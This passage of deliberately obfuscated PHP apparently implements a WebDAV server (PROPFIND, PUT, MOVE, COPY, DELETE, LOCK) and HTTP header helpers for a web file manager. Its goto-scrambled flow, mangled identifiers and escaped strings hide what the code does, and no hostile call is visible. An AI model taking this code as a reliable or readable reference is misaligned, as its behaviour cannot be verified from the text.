$_SERVER[$d¹˜è‚ƒÅ¦[1783]] : $_SERVER[$d¹˜è‚ƒÅ¦[1382]]; $c°í¦¡·Ìù = KodIO::clear(rawurldecode($c°í¦¡·Ìù)); if (!strstr($c°í¦¡·Ìù, KodIO::clear($this->urlBase))) { return !1; } return substr($c°í¦¡·Ìù, strpos($c°í¦¡·Ìù, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($f„­ÖÎîéÛ) { return file_exists($f„­ÖÎîéÛ); } public function pathMkdir($cÍÑÒ¯‰çù) { return mkdir($cÍÑÒ¯‰çù, 511, !0); } public function pathInfo($EÜĞŸß×) { return path_info($EÜĞŸß×); } public function pathList($fù¦Ä’‹Ö) { return path_list($fù¦Ä’‹Ö); } public function pathOut($e”Ä¿šè‰È) { echo file_get_contents($e”Ä¿šè‰È); } public function pathPut($dåˆŞãÉÁˆ, $A£Ø­¬×Ñ = '') { if (!$A£Ø­¬×Ñ) { return file_put_contents($dåˆŞãÉÁˆ, $_SERVER[îÖ][33]); } return move_path($A£Ø­¬×Ñ, $dåˆŞãÉÁˆ); } public function pathRemove($C½©ãÈ×õ) { if (is_file($C½©ãÈ×õ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($CŸÛ¢¥¢Š…, $eÏêæèÉÍµ) { return move_path($CŸÛ¢¥¢Š…, $eÏêæèÉÍµ); } public function pathCopy($BŞ„÷õÌÜ, $EŞ…í‹æ¿À) { return copy_dir($BŞ„÷õÌÜ, $EŞ…í‹æ¿À); } public function parsePath($EÔÕ‚Œ’Ä) { return $EÔÕ‚Œ’Ä; } public function parseItem($b®íëæ”£Ä, $eãÏ¹¤£Ä“) { goto BÛö¸ÈÔÛÏ; aŒĞ†ñ’†¬: if ($eãÏ¹¤£Ä“) { $D“©¨‰ÒÌŞ = $fä¸¬½ª[8] . str_replace($fä¸¬½ª[172], $fä¸¬½ª[8], rawurlencode($this->pathGet())); } if (!trim($b®íëæ”£Ä[$fä¸¬½ª[107]])) { $b®íëæ”£Ä[$fä¸¬½ª[107]] = time(); } if (!trim($b®íëæ”£Ä[$fä¸¬½ª[187]])) { $b®íëæ”£Ä[$fä¸¬½ª[187]] = time(); } goto c“”ÀÛíñ“; c“”ÀÛíñ“: $e à¨çİ½ = array($fä¸¬½ª[1784] => KodIO::clear($this->urlBase . $D“©¨‰ÒÌŞ), $fä¸¬½ª[107] => @gmdate($fä¸¬½ª[1785], $b®íëæ”£Ä[$fä¸¬½ª[107]]), $fä¸¬½ª[187] => @gmdate($fä¸¬½ª[1786], $b®íëæ”£Ä[$fä¸¬½ª[187]]), $fä¸¬½ª[77] => $b®íëæ”£Ä[$fä¸¬½ª[77]] ? $b®íëæ”£Ä[$fä¸¬½ª[77]] : 0); return $e à¨çİ½; goto A‰÷°„áÁ; BÛö¸ÈÔÛÏ: $fä¸¬½ª =& $_SERVER[îÖ]; $D“©¨‰ÒÌŞ = $this->pathGet() . $fä¸¬½ª[8] . $b®íëæ”£Ä[$fä¸¬½ª[28]]; $D“©¨‰ÒÌŞ = $fä¸¬½ª[8] . str_replace($fä¸¬½ª[172], $fä¸¬½ª[8], rawurlencode($D“©¨‰ÒÌŞ)); goto aŒĞ†ñ’†¬; A‰÷°„áÁ: } public function parseItemXml($eÂ¬³åÂ›, $E£åºÍæªƒ) { $c·îÁË³„å =& $_SERVER[îÖ]; $A¶öà‘ì‚î = $this->parseItem($eÂ¬³åÂ›, $E£åºÍæªƒ); if ($eÂ¬³åÂ›[$c·îÁË³„å[29]] == $c·îÁË³„å[76]) { $E‰Şá”å¯¨ = $c·îÁË³„å[1787]; $E‰Şá”å¯¨ .= $c·îÁË³„å[1788]; } else { $dÖ…¤Ø†¬Ñ = $eÂ¬³åÂ›[$c·îÁË³„å[160]] ? $eÂ¬³åÂ›[$c·îÁË³„å[160]] : get_path_ext($eÂ¬³åÂ›[$c·îÁË³„å[28]]); $b¥´Û­•¡ê = get_file_mime($dÖ…¤Ø†¬Ñ); $E‰Şá”å¯¨ = $c·îÁË³„å[1789]; $E‰Şá”å¯¨ .= "\x3c\104\x3a\147\x65\x74\x63\157\156\164\x65\x6e\x74\164\171\160\x65\x3e{$b¥´Û­•¡ê}\74\x2f\x44\x3a\x67\145\164\x63\x6f\156\164\x65\156\164\x74\171\x70\145\76"; } return "\12\x9\11\x3c\104\72\162\145\x73\160\x6f\156\x73\145\76\xa\x9\x9\x9\x3c\104\72\150\x72\145\x66\76{$A¶öà‘ì‚î[$c·îÁË³„å[1784]]}\x3c\57\104\x3a\150\162\145\x66\x3e\xa\x9\11\x9\x3c\104\72\x70\x72\157\160\163\164\x61\164\x3e\xa\11\11\11\x9\x3c\x44\x3a\160\x72\157\x70\76\xa\11\x9\11\x9\x9\74\x44\72\x67\x65\164\154\141\x73\164\x6d\157\144\151\146\151\x65\x64\76{$A¶öà‘ì‚î[$c·îÁË³„å[107]]}\x3c\57\x44\72\x67\x65\164\x6c\x61\163\x74\x6d\157\x64\151\146\151\x65\144\76\xa\11\x9\x9\11\11\x3c\x44\72\143\x72\x65\141\x74\x69\x6f\x6e\x64\x61\164\x65\76{$A¶öà‘ì‚î[$c·îÁË³„å[187]]}\74\x2f\104\72\x63\162\145\141\164\151\157\x6e\144\141\x74\145\76\12\x9\x9\x9\x9\11\74\104\x3a\x67\x65\x74\x63\x6f\156\164\x65\x6e\x74\x6c\145\156\x67\x74\x68\76{$A¶öà‘ì‚î[$c·îÁË³„å[77]]}\x3c\57\104\72\147\145\x74\143\x6f\x6e\164\x65\156\164\x6c\145\x6e\147\x74\x68\76\12\x9\11\11\11\11{$E‰Şá”å¯¨}\12\11\x9\x9\11\x3c\57\104\72\160\162\157\160\76\xa\x9\11\11\x9\74\104\72\163\x74\141\164\x75\x73\76\x48\x54\124\x50\57\61\56\x31\x20\x32\60\60\40\x4f\x4b\74\x2f\104\72\x73\x74\141\x74\x75\x73\76\xa\11\11\x9\x3c\57\x44\x3a\x70\162\157\x70\x73\164\141\164\76\xa\11\11\x3c\x2f\104\72\162\145\163\x70\x6f\x6e\x73\145\76"; } public function pathListMerge($FéÑØëòÒ) { goto E‰£¼¦Î£; E‰£¼¦Î£: $a¿˜¡œŠ¿Å =& $_SERVER[îÖ]; if (!$FéÑØëòÒ) { return $FéÑØëòÒ; } $bò—Ñö = array($a¿˜¡œŠ¿Å[73], $a¿˜¡œŠ¿Å[74], $a¿˜¡œŠ¿Å[1790]); goto EÓ°ñÑó…; EÓ°ñÑó…: $DÃ¤õªÃó = array(); foreach ($FéÑØëòÒ as $AÑ©²Ó‘ª‰ => $cÜâèŒÑ‘’) { if (!in_array($AÑ©²Ó‘ª‰, $bò—Ñö) || !is_array($cÜâèŒÑ‘’)) { continue; } $DÃ¤õªÃó = array_merge($DÃ¤õªÃó, $cÜâèŒÑ‘’); } foreach ($DÃ¤õªÃó as &$cªÅš«‚Œ) { $cªÅš«‚Œ[$a¿˜¡œŠ¿Å[28]] = str_replace($a¿˜¡œŠ¿Å[8], $a¿˜¡œŠ¿Å[1384], $cªÅš«‚Œ[$a¿˜¡œŠ¿Å[28]]); } goto cÍÁÍä•š; cÍÁÍä•š: return $DÃ¤õªÃó; goto dƒäÂ¾æ®Ë; dƒäÂ¾æ®Ë: } public function httpPROPFIND() { goto f°«˜–ÃËù; CâÑ´ ÓºŸ: return array($A´Ãéå¨Ø§[1793] => 207, $A´Ãéå¨Ø§[1794] => "\74\104\72\155\x75\154\x74\151\x73\164\141\x74\165\163\40\x78\155\154\x6e\163\72\x44\75\x22\104\x41\x56\72\x22\x3e\xa{$EÃÀ¶â„ˆ–}\xa\74\57\104\72\155\165\x6c\x74\x69\163\164\141\164\165\x73\x3e"); goto F²æâ©°éË; f°«˜–ÃËù: $A´Ãéå¨Ø§ =& $_SERVER[îÖ]; $E¶›İÏ¨·½ = $this->pathList($this->path); $AÇä“­Îâ¦ = $this->pathListMerge($E¶›İÏ¨·½); goto cë‘ì¢Ãï; f¾ŸÌÁøÏã: if ($FÛà¤á·÷Š) { $AÇä“­Îâ¦ = array($aÁµÈ©ç…ƒ); } else { $aÁµÈ©ç…ƒ[$A´Ãéå¨Ø§[28]] = $A´Ãéå¨Ø§[33]; $AÇä“­Îâ¦ = array_merge(array($aÁµÈ©ç…ƒ), $AÇä“­Îâ¦); } $EÃÀ¶â„ˆ– = $A´Ãéå¨Ø§[33]; foreach ($AÇä“­Îâ¦ as $FïĞˆîÏ–Ë) { $EÃÀ¶â„ˆ– .= $this->parseItemXml($FïĞˆîÏ–Ë, $FÛà¤á·÷Š); } goto CâÑ´ ÓºŸ; cë‘ì¢Ãï: $aÁµÈ©ç…ƒ = $E¶›İÏ¨·½[$A´Ãéå¨Ø§[1791]]; if (!is_array($AÇä“­Îâ¦) || $aÁµÈ©ç…ƒ[$A´Ãéå¨Ø§[1792]] === !1) { return array($A´Ãéå¨Ø§[1793] => 404, $A´Ãéå¨Ø§[1794] => $A´Ãéå¨Ø§[1795]); } $FÛà¤á·÷Š = $aÁµÈ©ç…ƒ[$A´Ãéå¨Ø§[29]] == $A´Ãéå¨Ø§[167] || HttpHeader::get($A´Ãéå¨Ø§[1770]) == $A´Ãéå¨Ø§[468]; goto f¾ŸÌÁøÏã; F²æâ©°éË: } public function httpHEAD() { $Eó”ºÅÂ¤• =& $_SERVER[îÖ]; $CõãÛ“£Ö½ = $this->pathInfo($this->path); if (!$CõãÛ“£Ö½ || $CõãÛ“£Ö½[$Eó”ºÅÂ¤•[29]] == $Eó”ºÅÂ¤•[76]) { return array($Eó”ºÅÂ¤•[1026] => 200, $Eó”ºÅÂ¤•[1201] => array($Eó”ºÅÂ¤•[1796])); } return array($Eó”ºÅÂ¤•[1026] => 200, $Eó”ºÅÂ¤•[1201] => array($Eó”ºÅÂ¤•[1797], $Eó”ºÅÂ¤•[136], $Eó”ºÅÂ¤•[1798] . $CõãÛ“£Ö½[$Eó”ºÅÂ¤•[77]], $Eó”ºÅÂ¤•[1799] . get_file_mime($CõãÛ“£Ö½[$Eó”ºÅÂ¤•[160]]), $Eó”ºÅÂ¤•[132] . gmdate($Eó”ºÅÂ¤•[1785], $CõãÛ“£Ö½[$Eó”ºÅÂ¤•[1248]]) . $Eó”ºÅÂ¤•[1800], $Eó”ºÅÂ¤•[1801])); } public function httpOPTIONS() { $CÉ«×ì§ =& $_SERVER[îÖ]; return array($CÉ«×ì§[1026] => 200, $CÉ«×ì§[1201] => array($CÉ«×ì§[1802], $CÉ«×ì§[1803], $CÉ«×ì§[1804], $CÉ«×ì§[1257])); } public function httpPROPPATCH() { $BÛ¢Ì›çŸ =& $_SERVER[îÖ]; $Fø¡ÅùÍ = $BÛ¢Ì›çŸ[1805] . $_SERVER[$BÛ¢Ì›çŸ[1382]] . $BÛ¢Ì›çŸ[1806]; return array($BÛ¢Ì›çŸ[1793] => 207, $BÛ¢Ì›çŸ[1794] => "\74\104\x3a\155\x75\154\164\x69\x73\x74\x61\164\165\x73\40\170\155\154\x6e\163\x3a\x44\x3d\42\104\x41\x56\x3a\x22\x3e\xa{$Fø¡ÅùÍ}\xa\x3c\57\104\x3a\155\x75\x6c\x74\151\163\x74\x61\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $E¹ Ó†ß « =& $_SERVER[îÖ]; $cŞÔà•²ñŠ = $this->uploadFile(); if ($cŞÔà•²ñŠ) { $f­ƒ¥—‡Â˜ = 204; } else { $cŞÔà•²ñŠ = $E¹ Ó†ß «[33]; $f­ƒ¥—‡Â˜ = 201; } $dÅõ…„ùƒ± = $this->pathPut($this->path, $cŞÔà•²ñŠ); if ($dÅõ…„ùƒ± == !1) { $f­ƒ¥—‡Â˜ = 404; } return array($E¹ Ó†ß «[1793] => $f­ƒ¥—‡Â˜); } private function uploadFile() { goto a¯ÂÇºˆ‰; F•Ä×Àšº: while (!feof($Ağ•‡½”í”)) { fwrite($AÍ…Åªàáˆ, fread($Ağ•‡½”í”, 1024 * 200)); } fclose($Ağ•‡½”í”); fclose($AÍ…Åªàáˆ); goto Eª×ó¤é¨; Eª×ó¤é¨: if (@filesize($fÍ†¢¥Åãë) > 0) { return $fÍ†¢¥Åãë; } @unlink($fÍ†¢¥Åãë); return !1; goto fê¸§Ë×Â; DáğÈ—¶¨Ó: $AÍ…Åªàáˆ = @fopen($fÍ†¢¥Åãë, $E¸¬’¯ƒÄñ[1516]); $Ağ•‡½”í” = @fopen($E¸¬’¯ƒÄñ[1808], $E¸¬’¯ƒÄñ[1515]); if (!$Ağ•‡½”í” || !$AÍ…Åªàáˆ) { @unlink($fÍ†¢¥Åãë); return !1; } goto F•Ä×Àšº; a¯ÂÇºˆ‰: $E¸¬’¯ƒÄñ =& $_SERVER[îÖ]; @mk_dir(TEMP_FILES); $fÍ†¢¥Åãë = TEMP_FILES . $E¸¬’¯ƒÄñ[1807] . rand_string(32); goto DáğÈ—¶¨Ó; fê¸§Ë×Â: } public function httpMKCOL() { $Aµ‰‚½’öà =& $_SERVER[îÖ]; if ($this->pathExists($this->path)) { return array($Aµ‰‚½’öà[1026] => 409); } $FàÀ°¼¨÷ä = $this->pathMkdir($this->path); return array($Aµ‰‚½’öà[1026] => $FàÀ°¼¨÷ä ? 201 : 403); } public function httpMOVE() { $A„Š² µ =& $_SERVER[îÖ]; $eÁÏÆ§˜š¥ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$A„Š² µ[1809]])) { $eÙ®Ö§‚¼î[$A„Š² µ[1810]] = $_SERVER[$A„Š² µ[1809]] == $A„Š² µ[1811]; } $bÕ¨¼ÈË— = $this->pathMove($this->path, $eÁÏÆ§˜š¥); return array($A„Š² µ[1026] => $bÕ¨¼ÈË— ? 201 : 404); } public function httpCOPY() { $fåù˜ñ’© = $this->parsePath($this->pathGet(!0)); $dæ½”êœÂ = $this->pathCopy($this->path, $fåù˜ñ’©); return array($_SERVER[îÖ][1026] => $dæ½”êœÂ ? 201 : 404); } public function httpDELETE() { $fêÌµÚ†¶İ = $this->pathRemove($this->path); return array($_SERVER[îÖ][1026] => $fêÌµÚ†¶İ ? 200 : 503); } public function httpLOCK() { $BÑè‹£ò£º =& $_SERVER[îÖ]; $bàğ–Í¨Ôî = md5($this->path); $dà¢½¦ª¨¼ = $BÑè‹£ò£º[1812] . $this->xmlGet($BÑè‹£ò£º[1813]) . $BÑè‹£ò£º[1814] . $bàğ–Í¨Ôî . $BÑè‹£ò£º[1815]; return array($BÑè‹£ò£º[1026] => 200, $BÑè‹£ò£º[1201] => array($BÑè‹£ò£º[1816] . $bàğ–Í¨Ôî, $BÑè‹£ò£º[1817]), $BÑè‹£ò£º[1818] => $dà¢½¦ª¨¼); } public function httpUNLOCK() { return array($_SERVER[îÖ][1026] => 204); } public function xmlGet($EŸ¸”£°ƒ½) { goto fÇŠ´‹íùù; A‘§» ªÁ–: $A¸«¥ù²ŠÌ = array_shift(explode($cƒˆšãäÔŒ[8], $EŸ¸”£°ƒ½)); $B„ø©¿Ç† = $Aî¦¿—…ƒ¶->getElementsByTagNameNS($cƒˆšãäÔŒ[1820], $A¸«¥ù²ŠÌ); if ($B„ø©¿Ç†) { return $B„ø©¿Ç†[0]->nodeValue; } goto DÜĞĞÔøĞƒ; fÇŠ´‹íùù: $cƒˆšãäÔŒ =& $_SERVER[îÖ]; static $Aî¦¿—…ƒ¶ = false; if (!$Aî¦¿—…ƒ¶) { $eÓöˆªŠ˜ = file_get_contents($cƒˆšãäÔŒ[1819]); $Aî¦¿—…ƒ¶ = new DOMDocument(); $Aî¦¿—…ƒ¶->loadXML($eÓöˆªŠ˜); } goto A‘§» ªÁ–; DÜĞĞÔøĞƒ: return $cƒˆšãäÔŒ[33]; goto D›Ş¤ùä¢Ó; D›Ş¤ùä¢Ó: } public static function response($dê»µàÖÙ) { goto d²ï—…å¦Û; d²ï—…å¦Û: $Dğ»›Ïç®À =& $_SERVER[îÖ]; $B÷ÂÁà‰Ê† = is_array($dê»µàÖÙ[$Dğ»›Ïç®À[1201]]) ? $dê»µàÖÙ[$Dğ»›Ïç®À[1201]] : array(); $B÷ÂÁà‰Ê†[] = HttpHeader::code($dê»µàÖÙ[$Dğ»›Ïç®À[1026]]); goto a×‹¬šˆÒá; a×‹¬šˆÒá: $B÷ÂÁà‰Ê†[] = $Dğ»›Ïç®À[1760]; $B÷ÂÁà‰Ê†[] = $Dğ»›Ïç®À[1761]; foreach ($B÷ÂÁà‰Ê† as $dø—å©ÆÖŞ) { header($dø—å©ÆÖŞ); } goto C»ªƒÃ¥ó; C»ªƒÃ¥ó: if (is_string($dê»µàÖÙ[$Dğ»›Ïç®À[1818]])) { header($Dğ»›Ïç®À[1821]); $e¡î†ÇôŠù = $Dğ»›Ïç®À[1822] . $Dğ»›Ïç®À[217] . $dê»µàÖÙ[$Dğ»›Ïç®À[1818]]; echo $e¡î†ÇôŠù; } goto F¢­ËÀŒó‰; F¢­ËÀŒó‰: } } class HttpHeader { public static $_headers = array("\110\x6f\x73\x74" => "\x48\124\124\x50\137\x48\x4f\123\124", "\x55\x73\145\x72\55\101\x67\x65\156\x74" => "\x48\x54\124\x50\137\x55\x53\x45\122\137\101\x47\105\116\124", "\x43\157\156\x74\x65\156\x74\x2d\124\171\160\x65" => "\x48\124\124\120\137\103\x4f\x4e\124\x45\116\x54\137\x54\x59\x50\105", "\x43\x6f\156\164\145\156\164\x2d\114\x65\x6e\147\x74\x68" => "\x48\124\124\x50\x5f\103\117\116\124\x45\x4e\124\x5f\114\105\116\x47\x54\110", "\x44\145\x70\x74\x68" => "\x48\x54\x54\x50\x5f\104\105\120\x54\x48", "\105\x78\160\x65\x63\164" => "\110\x54\x54\120\137\105\130\120\x45\x43\124", "\x49\146\x2d\116\157\156\145\55\115\x61\164\143\x68" => "\x48\124\x54\x50\137\x49\x46\137\x4e\117\116\x45\x5f\x4d\x41\124\x43\x48", "\x49\146\x2d\115\x61\164\x63\x68" => "\110\124\124\x50\137\111\x46\137\115\x41\x54\103\110", "\111\146\x2d\122\x61\156\147\145" => "\x48\x54\x54\120\x5f\x49\x46\137\122\101\x4e\107\105", "\x4c\141\x73\164\x2d\x4d\157\144\151\x66\x69\145\144" => "\110\x54\124\120\x5f\x4c\101\123\124\137\115\117\x44\x49\x46\x49\105\x44", "\111\x66\55\x4d\157\x64\x69\146\151\145\144\x2d\x53\x69\156\143\x65" => "\x48\124\x54\120\137\111\106\x5f\x4d\x4f\x44\x49\106\x49\105\x44\137\123\x49\116\x43\105", "\x49\x66\55\125\x6e\x6d\x6f\144\151\146\x69\x65\144\55\123\x69\x6e\143\x65" => "\x48\x54\124\x50\137\111\106\x5f\125\x4e\115\x4f\x44\111\x46\x49\105\104\137\123\x49\x4e\103\x45", "\x52\141\156\x67\145" => "\110\124\124\x50\x5f\122\101\x4e\x47\105", "\x54\151\155\x65\x6f\x75\x74" => "\110\124\124\x50\137\124\x49\x4d\x45\117\x55\x54", "\x49\146" => "\x48\x54\x54\120\x5f\x49\106", "\x4c\157\x63\x6b\55\x54\157\153\x65\x6e" => "\x48\x54\124\120\137\x4c\x4f\x43\113\x5f\x54\117\x4b\x45\116", "\117\166\145\x72\167\162\151\x74\145" => "\110\124\124\120\137\117\126\105\122\127\122\x49\x54\x45", "\x44\x65\163\x74\151\156\x61\x74\x69\157\x6e" => "\110\124\124\120\137\x44\105\123\124\x49\x4e\x41\124\x49\x4f\x4e", "\x52\x65\161\165\145\163\x74\55\111\144" => "\x52\x45\121\125\x45\123\x54\x5f\x49\x44", "\x52\145\x71\x75\145\163\164\x2d\102\157\144\x79\55\x46\x69\x6c\x65" => "\122\x45\x51\125\105\123\124\137\x42\117\104\131\x5f\x46\x49\114\105", "\122\x65\144\x69\x72\x65\143\x74\55\x53\164\141\164\x75\163" => "\x52\105\x44\x49\x52\105\103\124\x5f\x53\124\101\x54\125\123"); public static function init() { static $föç’ŒÎ”’ = false; if ($föç’ŒÎ”’) { return; } foreach ($_SERVER as $bõ•®¡Ñ„ => $A¤ÄÉŒãì) { $bõ•®¡Ñ„ = strtoupper($bõ•®¡Ñ„); if (!array_key_exists($bõ•®¡Ñ„, $_SERVER)) { continue; } $_SERVER[$bõ•®¡Ñ„] = $A¤ÄÉŒãì; } foreach (self::$_headers as $bõ•®¡Ñ„ => $Eñ‚õ‹˜Õº) { if (!array_key_exists($bõ•®¡Ñ„, $_SERVER)) { continue; } $_SERVER[$bõ•®¡Ñ„] = $_SERVER[$Eñ‚õ‹˜Õº]; $_SERVER[strtoupper($bõ•®¡Ñ„)] = $_SERVER[$Eñ‚õ‹˜Õº]; } } public static function get($FÙËŸ›Ş ¶) { self::init(); return $_SERVER[$FÙËŸ›Ş ¶] ? $_SERVER[$FÙËŸ›Ş ¶] : $_SERVER[$_SERVER[îÖ][1823] . strtoupper($FÙËŸ›Ş ¶)]; } public static function method() { return strtoupper(self::get($_SERVER[îÖ][154])); } public static function length() { $EŸŒÈÌº… =& $_SERVER[îÖ]; $CØÚµç™ƒ = self::get($EŸŒÈÌº…[1824]); if (!$CØÚµç™ƒ) { $CØÚµç™ƒ = self::get($EŸŒÈÌº…[1140]); } return $CØÚµç™ƒ; } public static function range() { $Aªöò—•… =& $_SERVER[îÖ]; $D‹‡‡é¯ô… = self::get($Aªöò—•…[198]); if (!$D‹‡‡é¯ô…) { return !1; } if (!preg_match($Aªöò—•…[1825], $D‹‡‡é¯ô…, $C‰’œÎ¶Ùâ)) { return !1; } if ($C‰’œÎ¶Ùâ[1] === $Aªöò—•…[33] && $C‰’œÎ¶Ùâ[2] === $Aªöò—•…[33]) { return !1; } return array($C‰’œÎ¶Ùâ[1] !== $Aªöò—•…[33] ? $C‰’œÎ¶Ùâ[1] : null, $C‰’œÎ¶Ùâ[2] !== $Aªöò—•…[33] ? $C‰’œÎ¶Ùâ[2] : null); } public static $statusCode = array("\61\x30\60" => "\x43\x6f\156\164\x69\x6e\165\145", "\x31\60\61" => "\123\167\x69\x74\143\x68\151\156\x67\x20\x50\x72\157\164\157\x63\157\x6c", "\61\x30\x32" => "\120\x72\x6f\143\145\163\163\x69\x6e\x67", "\x31\x30\x33" => "\105\x61\162\154\x79\x20\x48\x69\x6e\x74\x73", "\x32\x30\x30" => "\x4f\x4b", "\62\60\x31" => "\103\x72\x65\141\164\x65\144", "\62\60\62" => "\x41\x63\x63\145\x70\164\x65\144", "\62\60\63" => "\x4e\157\x6e\x2d\101\x75\x74\x68\x6f\x72\151\x74\x61\164\x69\166\x65\40\111\x6e\146\157\x72\155\x61\164\x69\x6f\x6e", "\62\x30\x34" => "\116\x6f\x20\103\x6f\156\x74\x65\156\x74", "\62\60\x35" => "\122\145\x73\x65\164\40\103\157\156\x74\145\156\x74", "\x32\60\66" => "\120\141\x72\164\151\x61\154\x20\x43\x6f\156\x74\x65\x6e\164", "\x32\x30\67" => "\x4d\165\x6c\164\151\55\123\164\x61\164\165\163", "\x33\60\x30" => "\x4d\165\x6c\x74\151\160\x6c\x65\40\103\150\157\x69\x63\x65\x73", "\x33\x30\x31" => "\x4d\x6f\166\x65\x64\x20\120\x65\x72\x6d\x61\156\145\x6e\x74\154\x79", "\63\60\62" => "\106\x6f\165\156\144", "\x33\60\x33" => "\123\x65\145\40\117\x74\150\x65\162", "\x33\x30\64" => "\116\157\x74\40\115\x6f\x64\151\x66\x69\x65\x64", "\63\60\65" => "\x55\x73\x65\x20\120\162\157\x78\x79", "\x33\x30\67" => "\124\145\155\160\x6f\162\x61\162\171\x20\122\x65\144\151\162\x65\143\164", "\x33\x30\x38" => "\x50\145\162\x6d\x61\156\x65\x6e\x74\x20\122\145\144\151\x72\x65\x63\x74", "\x34\60\60" => "\x42\141\144\x20\x52\x65\x71\165\145\163\164", "\x34\60\61" => "\x55\156\141\x75\x74\x68\x6f\x72\151\172\x65\x64", "\64\60\62" => "\x50\141\171\x6d\145\x6e\x74\40\x52\145\161\x75\x69\x72\x65\144", "\x34\60\x33" => "\x46\157\x72\142\x69\x64\x64\x65\156", "\64\x30\64" => "\x4e\157\164\x20\x46\157\165\x6e\x64", "\64\60\x35" => "\115\145\164\150\x6f\x64\x20\x4e\157\164\40\x41\x6c\x6c\x6f\x77\145\x64", "\x34\x30\x36" => "\116\157\x74\x20\x41\x63\143\x65\x70\164\141\142\154\145", "\x34\60\x37" => "\120\162\157\170\171\40\x41\x75\164\150\x65\156\x74\151\x63\141\164\151\157\x6e\x20\122\x65\x71\x75\x69\162\x65\144", "\64\60\x38" => "\122\145\161\x75\x65\163\164\x20\124\x69\155\x65\157\165\164", "\64\x30\71" => "\x43\x6f\156\x66\x6c\151\143\164", "\64\61\60" => "\107\x6f\156\x65", "\x34\61\61" => "\x4c\x65\156\x67\x74\x68\x20\122\x65\x71\x75\x69\162\x65\144", "\64\x31\62" => "\120\x72\x65\143\157\156\x64\151\x74\x69\x6f\x6e\x20\x46\x61\x69\x6c\x65\x64", "\64\61\63" => "\x52\145\x71\x75\145\x73\164\x20\105\156\164\x69\164\171\x20\x54\x6f\157\40\114\x61\x72\147\145", "\x34\61\64" => "\x52\145\x71\x75\145\x73\x74\x20\x55\x52\111\x20\x54\157\157\x20\114\141\x72\147\x65", "\x34\x31\65" => "\125\156\x73\x75\x70\x70\157\x72\x74\x65\144\x20\x4d\x65\x64\x69\141\x20\x54\171\160\145", "\64\x31\x36" => "\x52\x65\x71\165\x65\163\164\145\x64\40\122\x61\156\x67\145\x20\x4e\x6f\x74\x20\x53\141\164\151\x73\x66\151\141\x62\154\x65", "\x34\x31\67" => "\x45\x78\x70\145\143\x74\141\x74\x69\x6f\156\40\x46\x61\151\154\145\x64", "\64\62\x32" => "\125\x6e\160\x72\157\143\145\x73\x73\x61\142\154\x65\40\105\156\164\x69\x74\171", "\x34\x32\x33" => "\114\x6f\143\153\145\x64", "\64\62\x34" => "\x46\141\x69\154\x65\x64\x20\x44\145\160\145\156\144\x65\156\x63\171", "\64\62\x35" => "\125\x6e\157\162\x64\x65\x72\x65\x64\x20\103\x6f\x6c\x6c\145\143\164\151\157\x6e", "\x34\x32\x36" => "\125\160\x67\x72\141\144\x65\40\122\x65\161\165\x69\162\145\x64", "\x34\62\x38" => "\120\x72\145\143\157\x6e\x64\151\164\x69\x6f\156\x20\x52\x65\x71\x75\151\162\x65\144", "\64\x32\71" => "\x54\x6f\x6f\x20\x4d\x61\156\x79\x20\122\145\161\x75\x65\x73\x74\163", "\64\x33\x31" => "\x52\145\161\165\x65\163\164\40\110\x65\x61\x64\145\x72\40\x46\151\145\154\144\163\40\124\x6f\157\x20\114\141\x72\x67\145", "\x34\64\x34" => "\x4e\x6f\x20\x52\x65\163\x70\157\156\163\x65", "\x34\65\x30" => "\x42\154\x6f\x63\153\145\144\40\142\x79\40\127\x69\156\x64\157\x77\163\40\120\x61\162\145\156\164\141\x6c\40\103\x6f\x6e\164\x72\x6f\x6c\163", "\64\65\61" => "\125\156\x61\x76\141\151\x6c\141\142\154\145\x20\x46\x6f\x72\40\114\145\x67\141\154\x20\x52\145\x61\x73\x6f\x6e\x73", "\64\x39\x34" => "\x52\145\161\x75\145\163\x74\40\x48\x65\141\144\x65\x72\40\x54\157\x6f\x20\x4c\141\x72\x67\x65", "\65\x30\60" => "\x49\156\x74\145\x72\x6e\141\154\40\123\x65\162\166\x65\162\40\x45\x72\162\157\162", "\x35\60\61" => "\x4e\x6f\164\x20\x49\x6d\160\x6c\x65\155\145\156\164\x65\x64", "\65\60\62" => "\x42\141\144\x20\x47\x61\164\145\167\x61\171", "\65\x30\63" => "\x53\145\162\x76\151\x63\x65\40\x55\x6e\x61\166\x61\x69\154\x61\x62\x6c\145", "\65\x30\64" => "\107\141\164\145\167\x61\x79\x20\124\151\155\145\x6f\x75\164", "\65\x30\65" => "\x48\x54\x54\120\40\x56\x65\162\x73\151\x6f\156\40\x6e\157\164\x20\163\x75\160\x70\x6f\162\164\x65\x64", "\65\60\x37" => "\x49\x6e\x73\x75\x66\146\151\x63\151\145\x6e\164\40\123\164\x6f\x72\141\x67\x65"); public static function code($bï¬äÃÖº‹) { $F†Œ˜ê°¡ =& $_SERVER[îÖ]; $bï¬äÃÖº‹ = $bï¬äÃÖº‹ . $F†Œ˜ê°¡[33]; $CÄ¸ƒö¶¶Ş = self::$statusCode[$bï¬äÃÖº‹]; $CÄ¸ƒö¶¶Ş = $CÄ¸ƒö¶¶Ş ? "\x48\124\x54\120\57\x31\56\x31\x20{$bï¬äÃÖº‹}\x20" . $CÄ¸ƒö¶¶Ş : $F†Œ˜ê°¡[33]; return $CÄ¸ƒö¶¶Ş; } } goto F¦ê—¹‘Ğ‘; c†Èñ¾’Çº: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\x75\163\x65\162\x5f\x6d\x65\164\141", "\155\145\x74\x61\x46\151\145\154\144" => "\x75\163\145\x72\x49\104"); protected $simpleField = "\165\x73\145\x72\111\x44\x2c\156\151\x63\x6b\x4e\x61\x6d\x65\x2c\156\x61\155\x65\54\x61\x76\141\164\x61\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($dÀ‡•‘‹³) { $Aò¹„ãğÈ =& $_SERVER[îÖ]; $AŠô×çÒ = $Aò¹„ãğÈ[2488]; return array($Aò¹„ãğÈ[2165] => array($dÀ‡•‘‹³[0], $AŠô×çÒ), 